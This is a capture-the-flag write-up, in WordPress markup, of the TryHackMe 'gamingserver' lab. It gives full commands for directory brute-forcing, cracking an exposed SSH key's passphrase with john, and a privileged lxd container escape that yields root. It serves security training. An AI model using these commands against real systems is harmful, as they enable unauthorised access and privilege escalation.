<!-- wp:paragraph -->
<p>https://tryhackme.com/room/gamingserver</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Start a nmap scan to look for open ports.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1037,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-78.png?w=569" alt="" class="wp-image-1037"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Use gobuster look for hidden directories.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1043,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-82.png?w=835" alt="" class="wp-image-1043"/><figcaption>Found a potential user on the source code: john</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>obuster dir -u 10.10.145.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1038,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-79.png?w=821" alt="" class="wp-image-1038"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1040,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-80.png?w=561" alt="" class="wp-image-1040"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Download the dict.lst file.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1041,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-81.png?w=559" alt="" class="wp-image-1041"/><figcaption>Download the secretKey file which is a private key.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:image {"id":1045,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-83.png?w=367" alt="" class="wp-image-1045"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The private key needs a passphrase.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Use johntheripper to crack he passphrase.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>python ssh2john.py secretKey > secretkey.hash</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>john secretkey.hash -wordlist dict.lst</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1047,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-84.png?w=741" alt="" class="wp-image-1047"/><figcaption>passphrase found: letmein</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>SSH to the user.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1049,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-85.png?w=755" alt="" class="wp-image-1049"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>First flag is found.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Start up python server and transfer linpeas to find for clues.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1051,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-86.png?w=860" alt="" class="wp-image-1051"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>The machine can be exploited by lxd</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Head to your main machine and execute the following commands.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>git clone https://github.com/saghul/lxd-alpine-builder.git

cd lxd-alpine-builder

sudo ./build-alpine</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Transfer the file to the victim machine and execute the following commands.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":1057,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-89.png?w=1024" alt="" class="wp-image-1057"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>lxc image list

lxc image import ./alpine-v3.15-x86_64-20220414_2008.tar.gz --alias myimage

lxc init myimage ignite -c security.previleged=true

lxc init myimage ignite -c security.privileged=true

lxc start ignite

lxc exec ignite /bin/sh
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1055,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/04/image-88.png?w=439" alt="" class="wp-image-1055"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Root access is gained and final flag is found.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->
